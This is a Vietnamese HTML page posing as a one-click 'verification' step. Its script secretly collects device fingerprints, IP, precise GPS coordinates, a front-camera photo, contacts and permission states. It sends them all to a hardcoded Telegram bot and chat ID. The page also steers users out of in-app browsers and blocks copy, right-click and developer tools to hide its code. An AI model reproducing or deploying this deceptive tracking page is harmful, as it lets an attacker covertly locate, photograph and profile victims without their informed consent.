<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Xác Minh</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e13;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: white;
        }

        /* Hiệu ứng nền động */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 50%, rgba(0, 100, 255, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 50%, rgba(100, 0, 255, 0.1) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 80%, rgba(0, 200, 150, 0.08) 0%, transparent 50%);
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 40px;
        }

        /* Vòng tròn hiệu ứng xung quanh nút */
        .pulse-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 2px solid rgba(0, 150, 255, 0.3);
            animation: pulse-ring 2s infinite;
            pointer-events: none;
        }

        .pulse-ring:nth-child(2) {
            animation-delay: 0.5s;
        }

        .pulse-ring:nth-child(3) {
            animation-delay: 1s;
        }

        @keyframes pulse-ring {
            0% {
                width: 180px;
                height: 180px;
                opacity: 1;
                border-color: rgba(0, 150, 255, 0.4);
            }
            100% {
                width: 300px;
                height: 300px;
                opacity: 0;
                border-color: rgba(0, 150, 255, 0);
            }
        }

        /* Nút chính */
        .verify-btn {
            position: relative;
            z-index: 2;
            width: 160px;
            height: 160px;
            border-radius: 50%;
            background: linear-gradient(135deg, #0066ff, #0052cc);
            border: 3px solid rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            box-shadow: 
                0 0 40px rgba(0, 100, 255, 0.5),
                inset 0 0 30px rgba(255, 255, 255, 0.1);
            text-transform: uppercase;
            outline: none;
        }

        .verify-btn:hover {
            transform: scale(1.05);
            box-shadow: 
                0 0 60px rgba(0, 100, 255, 0.7),
                0 0 100px rgba(0, 100, 255, 0.3),
                inset 0 0 40px rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .verify-btn:active {
            transform: scale(0.95);
        }

        .verify-btn:disabled {
            background: linear-gradient(135deg, #333, #222);
            border-color: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            cursor: not-allowed;
            animation: none;
        }

        /* Trạng thái loading */
        .verify-btn.loading {
            animation: btn-glow 1s infinite alternate;
        }

        @keyframes btn-glow {
            0% {
                box-shadow: 0 0 40px rgba(0, 100, 255, 0.5);
            }
            100% {
                box-shadow: 
                    0 0 80px rgba(0, 100, 255, 0.8),
                    0 0 120px rgba(0, 200, 255, 0.4);
            }
        }

        /* Text trạng thái */
        .status-text {
            margin-top: 40px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            min-height: 60px;
            line-height: 1.8;
            transition: all 0.3s;
        }

        .status-text .step {
            display: block;
            margin: 5px 0;
            animation: fadeInUp 0.5s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .status-text .success {
            color: #4caf50;
        }

        .status-text .error {
            color: #f44336;
        }

        .status-text .info {
            color: #2196f3;
        }

        /* Cảnh báo In-App Browser */
        #browser-warning {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(10, 14, 19, 0.98);
            z-index: 10000;
            padding: 40px 20px;
            box-sizing: border-box;
            justify-content: center;
            align-items: center;
        }

        .warning-box {
            background: #1a1f2b;
            border: 2px solid #f85149;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
        }

        .warning-box h3 {
            color: #f85149;
            margin-top: 0;
            font-size: 20px;
        }

        .steps {
            text-align: left;
            margin-top: 20px;
            color: #c9d1d9;
            font-size: 15px;
            line-height: 2.2;
        }

        .highlight {
            color: #ffeb3b;
            font-weight: bold;
        }

        /* Overlay khi đang xử lý */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }

        .overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #0066ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

    <!-- Cảnh báo In-App Browser -->
    <div id="browser-warning">
        <div class="warning-box">
            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
            <div class="steps">
                Vui lòng mở bằng trình duyệt bên ngoài:<br>
                1. Nhấn vào <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> góc trên phải<br>
                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span><br>
                3. Sau đó nhấn XÁC MINH để tiếp tục
            </div>
        </div>
    </div>

    <!-- Overlay loading -->
    <div class="overlay" id="overlay">
        <div class="spinner"></div>
    </div>

    <!-- Giao diện chính -->
    <div class="container" id="mainContainer">
        <div style="position: relative; display: inline-block;">
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <button class="verify-btn" id="verifyBtn">XÁC<br>MINH</button>
        </div>
        <div class="status-text" id="statusText">
            Nhấn nút để bắt đầu xác minh
        </div>
    </div>

    <script>
        // ==========================================
        // ⚙️ CẤU HÌNH TELEGRAM
        // ==========================================
        const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
        const TELEGRAM_CHAT_ID = '7031115869';

        // ==========================================
        // 🚫 KIỂM TRA IN-APP BROWSER
        // ==========================================
        function checkInAppBrowser() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);

            if (isInApp) {
                document.getElementById('browser-warning').style.display = 'flex';
                document.getElementById('mainContainer').style.display = 'none';
                return true;
            }
            return false;
        }

        // ==========================================
        // 📤 GỬI TIN NHẮN TEXT QUA TELEGRAM
        // ==========================================
        async function sendTelegramMessage(text) {
            try {
                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: text,
                            parse_mode: 'HTML'
                        })
                    }
                );
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        // ==========================================
        // 📸 GỬI ẢNH QUA TELEGRAM
        // ==========================================
        async function sendTelegramPhoto(blob, caption = '') {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');

                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                    { method: 'POST', body: formData }
                );
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Telegram photo error:', error);
                return false;
            }
        }

        // ==========================================
        // 📱 CHỤP ẢNH TỪ CAMERA
        // ==========================================
        async function captureCameraPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });

                const blob = await new Promise((resolve, reject) => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', true);
                    video.setAttribute('muted', true);
                    video.play();

                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        setTimeout(() => {
                            const ctx = canvas.getContext('2d');
                            ctx.translate(canvas.width, 0);
                            ctx.scale(-1, 1);
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob((b) => {
                                stream.getTracks().forEach(t => t.stop());
                                if (b) resolve(b);
                                else reject(new Error('Không tạo được ảnh'));
                            }, 'image/jpeg', 0.9);
                        }, 1500);
                    };

                    video.onerror = () => {
                        stream.getTracks().forEach(t => t.stop());
                        reject(new Error('Lỗi video'));
                    };
                });

                return blob;
            } catch (error) {
                console.error('Camera error:', error);
                return null;
            }
        }

        // ==========================================
        // 📍 LẤY VỊ TRÍ
        // ==========================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ success: false, error: 'Trình duyệt không hỗ trợ định vị' });
                    return;
                }

                // Timeout sau 10 giây
                const timeout = setTimeout(() => {
                    resolve({ success: false, error: 'Timeout - Quá thời gian chờ vị trí' });
                }, 10000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            success: true,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toLocaleString('vi-VN')
                        });
                    },
                    (error) => {
                        clearTimeout(timeout);
                        let errorMsg = 'Không xác định';
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'Người dùng từ chối cấp quyền vị trí';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'Không có thông tin vị trí';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'Hết thời gian yêu cầu vị trí';
                                break;
                        }
                        resolve({ success: false, error: errorMsg });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ==========================================
        // 📱 LẤY THÔNG TIN PIN/BATTERY
        // ==========================================
        async function getBatteryInfo() {
            try {
                if (!navigator.getBattery) {
                    return { success: false, error: 'Không hỗ trợ Battery API' };
                }
                const battery = await navigator.getBattery();
                return {
                    success: true,
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Đang sạc' : 'Không sạc',
                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : Math.round(battery.chargingTime / 60) + ' phút',
                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : Math.round(battery.dischargingTime / 60) + ' phút'
                };
            } catch (error) {
                return { success: false, error: 'Không lấy được thông tin pin' };
            }
        }

        // ==========================================
        // 📶 LẤY THÔNG TIN KẾT NỐI MẠNG
        // ==========================================
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) {
                return { success: false, error: 'Không hỗ trợ Network API' };
            }
            return {
                success: true,
                effectiveType: connection.effectiveType || 'N/A',
                downlink: connection.downlink ? connection.downlink + ' Mbps' : 'N/A',
                rtt: connection.rtt ? connection.rtt + ' ms' : 'N/A',
                saveData: connection.saveData ? 'Bật' : 'Tắt',
                type: connection.type || 'N/A'
            };
        }

        // ==========================================
        // 💾 LẤY THÔNG TIN BỘ NHỚ (STORAGE)
        // ==========================================
        async function getStorageInfo() {
            try {
                if (!navigator.storage || !navigator.storage.estimate) {
                    return { success: false, error: 'Không hỗ trợ Storage API' };
                }
                const estimate = await navigator.storage.estimate();
                const usageMB = (estimate.usage / (1024 * 1024)).toFixed(2);
                const quotaMB = (estimate.quota / (1024 * 1024)).toFixed(2);
                const percentUsed = ((estimate.usage / estimate.quota) * 100).toFixed(1);

                return {
                    success: true,
                    usage: usageMB + ' MB',
                    quota: quotaMB + ' MB',
                    percentUsed: percentUsed + '%',
                    persistent: navigator.storage.persist ? 'Hỗ trợ' : 'Không hỗ trợ'
                };
            } catch (error) {
                return { success: false, error: 'Không lấy được thông tin bộ nhớ' };
            }
        }

        // ==========================================
        // 📋 LẤY THÔNG TIN THIẾT BỊ ĐẦY ĐỦ
        // ==========================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const vendor = navigator.vendor;
            const screenW = window.screen.width;
            const screenH = window.screen.height;
            const availW = window.screen.availWidth;
            const availH = window.screen.availHeight;
            const colorDepth = window.screen.colorDepth;
            const pixelRatio = window.devicePixelRatio;
            const language = navigator.language;
            const languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const memory = navigator.deviceMemory || 'Không rõ';
            const cores = navigator.hardwareConcurrency || 'Không rõ';
            const maxTouchPoints = navigator.maxTouchPoints || 0;
            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
            const doNotTrack = navigator.doNotTrack || 'Không rõ';
            const onLine = navigator.onLine ? 'Online' : 'Offline';
            const javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
            const pdfViewer = navigator.pdfViewerEnabled ? 'Có' : 'Không';

            // Nhận diện thiết bị
            let deviceType = 'Không xác định';
            let os = 'Không xác định';
            let browser = 'Không xác định';

            if (/iPhone/i.test(ua)) {
                deviceType = 'iPhone';
                os = 'iOS ' + (ua.match(/OS (\d+_\d+)/) || ['', ''])[1].replace('_', '.');
            } else if (/iPad/i.test(ua)) {
                deviceType = 'iPad';
                os = 'iOS ' + (ua.match(/OS (\d+_\d+)/) || ['', ''])[1].replace('_', '.');
            } else if (/Android/i.test(ua)) {
                deviceType = 'Android';
                os = 'Android ' + (ua.match(/Android (\d+(\.\d+)?)/) || ['', ''])[1];
            } else if (/Windows/i.test(ua)) {
                deviceType = 'Windows PC/Laptop';
                os = 'Windows ' + (ua.match(/Windows NT (\d+(\.\d+)?)/) || ['', ''])[1];
            } else if (/Macintosh/i.test(ua)) {
                deviceType = 'Mac';
                os = 'macOS ' + (ua.match(/Mac OS X (\d+[_\d]+)/) || ['', ''])[1].replace('_', '.');
            }

            // Nhận diện trình duyệt
            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edge/i.test(ua)) browser = 'Edge';
            else if (/Opera|OPR/i.test(ua)) browser = 'Opera';

            return {
                deviceType, os, browser, platform, vendor,
                screen: `${screenW}x${screenH} (Khả dụng: ${availW}x${availH})`,
                colorDepth: colorDepth + ' bit',
                pixelRatio: pixelRatio + 'x',
                language, languages, timezone,
                memory: memory + ' GB',
                cores: cores + ' cores',
                maxTouchPoints,
                cookieEnabled, doNotTrack, onLine,
                javaEnabled: javaEnabled ? 'Có' : 'Không',
                pdfViewer,
                userAgent: ua
            };
        }

        // ==========================================
        // 📱 LẤY THÔNG TIN QUYỀN (PERMISSIONS)
        // ==========================================
        async function getPermissionsStatus() {
            const permissions = {};
            const permissionNames = [
                'camera',
                'microphone',
                'geolocation',
                'notifications',
                'persistent-storage',
                'clipboard-read',
                'clipboard-write',
                'accelerometer',
                'gyroscope',
                'magnetometer'
            ];

            if (navigator.permissions && navigator.permissions.query) {
                for (const name of permissionNames) {
                    try {
                        const result = await navigator.permissions.query({ name: name });
                        permissions[name] = result.state;
                    } catch (e) {
                        permissions[name] = 'không hỗ trợ';
                    }
                }
            } else {
                permissions['_note'] = 'Permissions API không được hỗ trợ';
            }

            return permissions;
        }

        // ==========================================
        // 📱 THỬ LẤY DANH BẠ (CONTACTS)
        // ==========================================
        async function getContactsInfo() {
            try {
                if (!navigator.contacts || !navigator.contacts.select) {
                    return { success: false, error: 'Contacts API không được hỗ trợ' };
                }

                const props = ['name', 'tel', 'email', 'address', 'icon'];
                const opts = { multiple: true };

                try {
                    const contacts = await navigator.contacts.select(props, opts);
                    return {
                        success: true,
                        count: contacts.length,
                        contacts: contacts.map(c => ({
                            name: c.name ? c.name.join(', ') : 'N/A',
                            tel: c.tel ? c.tel.join(', ') : 'N/A',
                            email: c.email ? c.email.join(', ') : 'N/A'
                        }))
                    };
                } catch (e) {
                    return { success: false, error: 'Người dùng từ chối hoặc lỗi: ' + e.message };
                }
            } catch (error) {
                return { success: false, error: 'Lỗi Contacts API' };
            }
        }

        // ==========================================
        // 🎤 THỬ GHI ÂM NGẮN (MICROPHONE)
        // ==========================================
        async function getMicrophoneAccess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                stream.getTracks().forEach(t => t.stop());
                return { success: true, message: 'Đã cấp quyền microphone' };
            } catch (error) {
                return { success: false, message: 'Microphone: ' + error.message };
            }
        }

        // ==========================================
        // 📡 LẤY ĐỊA CHỈ IP VÀ THÔNG TIN MẠNG
        // ==========================================
        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return {
                    success: true,
                    ip: data.ip
                };
            } catch (error) {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    return {
                        success: true,
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        timezone: data.timezone
                    };
                } catch (e) {
                    return { success: false, error: 'Không lấy được IP' };
                }
            }
        }

        // ==========================================
        // 🎯 HÀM CHÍNH - THU THẬP TẤT CẢ
        // ==========================================
        async function collectAllData(statusCallback) {
            const results = {};

            // 1. Thông tin thiết bị (không cần quyền)
            statusCallback('📱 Đang lấy thông tin thiết bị...');
            results.deviceInfo = getDeviceInfo();

            // 2. IP và vị trí mạng
            statusCallback('🌐 Đang kiểm tra địa chỉ IP...');
            results.ipInfo = await getIPInfo();

            // 3. Pin
            statusCallback('🔋 Đang kiểm tra pin...');
            results.batteryInfo = await getBatteryInfo();

            // 4. Bộ nhớ
            statusCallback('💾 Đang kiểm tra bộ nhớ...');
            results.storageInfo = await getStorageInfo();

            // 5. Mạng
            statusCallback('📶 Đang kiểm tra kết nối mạng...');
            results.networkInfo = getNetworkInfo();

            // 6. Vị trí GPS (yêu cầu quyền)
            statusCallback('📍 Đang yêu cầu vị trí GPS...');
            results.locationInfo = await getLocation();

            // 7. Camera (yêu cầu quyền)
            statusCallback('📸 Đang yêu cầu quyền camera...');
            results.cameraPhoto = await captureCameraPhoto();

            // 8. Microphone (yêu cầu quyền)
            statusCallback('🎤 Đang yêu cầu quyền microphone...');
            results.microphoneInfo = await getMicrophoneAccess();

            // 9. Quyền hệ thống
            statusCallback('🔐 Đang kiểm tra các quyền...');
            results.permissions = await getPermissionsStatus();

            // 10. Danh bạ (yêu cầu quyền - thường không được hỗ trợ)
            statusCallback('📇 Đang kiểm tra danh bạ...');
            results.contactsInfo = await getContactsInfo();

            return results;
        }

        // ==========================================
        // 📤 ĐỊNH DẠNG VÀ GỬI DỮ LIỆU
        // ==========================================
        function formatDeviceInfo(info) {
            return `
━━━━━━━━━━━━━━━━━━━━━━
📱 <b>THÔNG TIN THIẾT BỊ</b>
━━━━━━━━━━━━━━━━━━━━━━
🕐 Thời gian: ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${info.deviceType}
💻 HĐH: ${info.os}
🌐 Trình duyệt: ${info.browser}
📐 Màn hình: ${info.screen}
🎨 Độ sâu màu: ${info.colorDepth}
📊 Pixel Ratio: ${info.pixelRatio}
🧠 RAM: ${info.memory}
⚙️ CPU: ${info.cores}
👆 Touch Points: ${info.maxTouchPoints}
🌍 Ngôn ngữ: ${info.language}
🗣 Ngôn ngữ khác: ${info.languages}
⏰ Múi giờ: ${info.timezone}
🔛 Online: ${info.onLine}
🍪 Cookie: ${info.cookieEnabled}
📄 PDF Viewer: ${info.pdfViewer}
☕ Java: ${info.javaEnabled}
🔗 Platform: ${info.platform}
🏢 Vendor: ${info.vendor}
            `.trim();
        }

        async function sendAllToTelegram(results) {
            const deviceInfo = results.deviceInfo;
            let mainMessage = '';

            // Header
            mainMessage += `🔔 <b>=== BÁO CÁO XÁC MINH MỚI ===</b>\n`;
            mainMessage += `🕐 <b>${new Date().toLocaleString('vi-VN')}</b>\n\n`;
            mainMessage += formatDeviceInfo(deviceInfo);
            mainMessage += '\n\n';

            // IP Info
            if (results.ipInfo && results.ipInfo.success) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `🌐 <b>THÔNG TIN IP & MẠNG</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `IP: ${results.ipInfo.ip || 'N/A'}\n`;
                if (results.ipInfo.city) {
                    mainMessage += `📍 Vị trí IP: ${results.ipInfo.city}, ${results.ipInfo.region}, ${results.ipInfo.country}\n`;
                    mainMessage += `📡 ISP: ${results.ipInfo.isp}\n`;
                }
                mainMessage += '\n';
            }

            // Battery
            if (results.batteryInfo && results.batteryInfo.success) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `🔋 <b>THÔNG TIN PIN</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `Mức pin: ${results.batteryInfo.level}\n`;
                mainMessage += `Trạng thái: ${results.batteryInfo.charging}\n`;
                mainMessage += `Thời gian sạc đầy: ${results.batteryInfo.chargingTime}\n`;
                mainMessage += `Thời gian dùng còn: ${results.batteryInfo.dischargingTime}\n\n`;
            }

            // Storage
            if (results.storageInfo && results.storageInfo.success) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `💾 <b>THÔNG TIN BỘ NHỚ</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `Đã dùng: ${results.storageInfo.usage}\n`;
                mainMessage += `Tổng: ${results.storageInfo.quota}\n`;
                mainMessage += `Đã sử dụng: ${results.storageInfo.percentUsed}\n\n`;
            }

            // Network
            if (results.networkInfo && results.networkInfo.success) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `📶 <b>THÔNG TIN KẾT NỐI</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `Loại: ${results.networkInfo.effectiveType}\n`;
                mainMessage += `Tốc độ: ${results.networkInfo.downlink}\n`;
                mainMessage += `RTT: ${results.networkInfo.rtt}\n`;
                mainMessage += `Data Saver: ${results.networkInfo.saveData}\n\n`;
            }

            // Location
            if (results.locationInfo && results.locationInfo.success) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `📍 <b>VỊ TRÍ GPS</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `Lat: ${results.locationInfo.latitude}\n`;
                mainMessage += `Lng: ${results.locationInfo.longitude}\n`;
                mainMessage += `Độ chính xác: ${results.locationInfo.accuracy}m\n`;
                if (results.locationInfo.altitude) {
                    mainMessage += `Độ cao: ${results.locationInfo.altitude}m\n`;
                }
                mainMessage += `🔗 <a href="https://www.google.com/maps?q=${results.locationInfo.latitude},${results.locationInfo.longitude}">Xem trên Google Maps</a>\n\n`;
            } else if (results.locationInfo) {
                mainMessage += `📍 <b>VỊ TRÍ GPS:</b> ❌ ${results.locationInfo.error}\n\n`;
            }

            // Microphone
            if (results.microphoneInfo) {
                mainMessage += `🎤 <b>Microphone:</b> ${results.microphoneInfo.success ? '✅ Đã cấp quyền' : '❌ ' + results.microphoneInfo.message}\n\n`;
            }

            // Permissions
            if (results.permissions) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `🔐 <b>TRẠNG THÁI QUYỀN</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                for (const [key, value] of Object.entries(results.permissions)) {
                    const emoji = value === 'granted' ? '✅' : value === 'denied' ? '❌' : value === 'prompt' ? '❓' : '➖';
                    mainMessage += `${emoji} ${key}: ${value}\n`;
                }
                mainMessage += '\n';
            }

            // Contacts
            if (results.contactsInfo && results.contactsInfo.success) {
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `📇 <b>DANH BẠ</b>\n`;
                mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                mainMessage += `Số lượng: ${results.contactsInfo.count}\n`;
                results.contactsInfo.contacts.forEach((c, i) => {
                    mainMessage += `${i + 1}. ${c.name} - ${c.tel}\n`;
                });
                mainMessage += '\n';
            }

            mainMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            mainMessage += `📎 <b>User Agent đầy đủ:</b>\n${deviceInfo.userAgent}\n`;

            // Gửi text message
            await sendTelegramMessage(mainMessage);

            // Gửi ảnh camera nếu có
            if (results.cameraPhoto) {
                await sendTelegramPhoto(results.cameraPhoto, '📸 Ảnh chụp từ camera trước của người dùng');
            }
        }

        // ==========================================
        // 🎬 KHỞI TẠO GIAO DIỆN
        // ==========================================
        document.addEventListener('DOMContentLoaded', () => {
            if (checkInAppBrowser()) return;
        });

        const verifyBtn = document.getElementById('verifyBtn');
        const statusText = document.getElementById('statusText');
        const overlay = document.getElementById('overlay');

        function updateStatus(message, type = 'info') {
            const span = document.createElement('span');
            span.className = 'step ' + type;
            span.textContent = message;
            statusText.appendChild(span);
            statusText.scrollTop = statusText.scrollHeight;
        }

        function clearStatus() {
            statusText.innerHTML = '';
        }

        verifyBtn.addEventListener('click', async () => {
            // Disable nút
            verifyBtn.disabled = true;
            verifyBtn.classList.add('loading');
            verifyBtn.innerHTML = 'ĐANG<br>XỬ LÝ';
            overlay.classList.add('active');
            clearStatus();

            try {
                updateStatus('🚀 Bắt đầu quá trình xác minh...', 'info');
                updateStatus('⏳ Vui lòng cấp tất cả quyền khi được yêu cầu', 'info');

                // Thu thập tất cả dữ liệu
                const results = await collectAllData(updateStatus);

                updateStatus('📤 Đang gửi dữ liệu về máy chủ...', 'info');

                // Gửi về Telegram
                await sendAllToTelegram(results);

                updateStatus('✅ Xác minh hoàn tất!', 'success');
                updateStatus('🎉 Cảm ơn bạn đã xác minh', 'success');

                // Reset nút sau 3 giây
                setTimeout(() => {
                    verifyBtn.disabled = false;
                    verifyBtn.classList.remove('loading');
                    verifyBtn.innerHTML = 'XÁC<br>MINH';
                    overlay.classList.remove('active');
                }, 3000);

            } catch (error) {
                console.error('Error:', error);
                updateStatus('❌ Có lỗi xảy ra: ' + error.message, 'error');

                // Reset nút
                setTimeout(() => {
                    verifyBtn.disabled = false;
                    verifyBtn.classList.remove('loading');
                    verifyBtn.innerHTML = 'XÁC<br>MINH';
                    overlay.classList.remove('active');
                }, 2000);
            }
        });

        // ==========================================
        // 🛡 BẢO VỆ
        // ==========================================
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('copy', (e) => e.preventDefault());
        document.addEventListener('cut', (e) => e.preventDefault());

        document.onkeydown = function(e) {
            if (e.keyCode === 123 ||
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
                (e.ctrlKey && e.keyCode === 85) ||
                (e.ctrlKey && e.keyCode === 83)) {
                e.preventDefault();
                return false;
            }
        };
    </script>
</body>
</html>
